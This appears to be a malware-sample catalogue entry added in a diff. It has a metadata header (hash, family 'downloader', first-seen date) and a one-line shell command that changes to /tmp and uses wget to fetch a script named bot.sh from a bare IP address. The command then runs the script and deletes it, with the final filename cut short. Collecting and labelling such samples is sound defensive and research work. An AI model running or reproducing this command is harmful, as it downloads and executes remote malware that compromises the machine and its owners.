@@ -1,0 +1,10 @@
+# sha256: 6bf405f0a65938900902dda51c3070054018c37f803f40147c776758e066cb4e
+# family: downloader
+# kind: script
+# size_bytes: 79
+# first_seen: 2026-07-20 11:43:23.299632 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp; wget -q http://94.154.43.123/bot.sh -O bot.sh; sh bot.sh; rm -rf bot.s
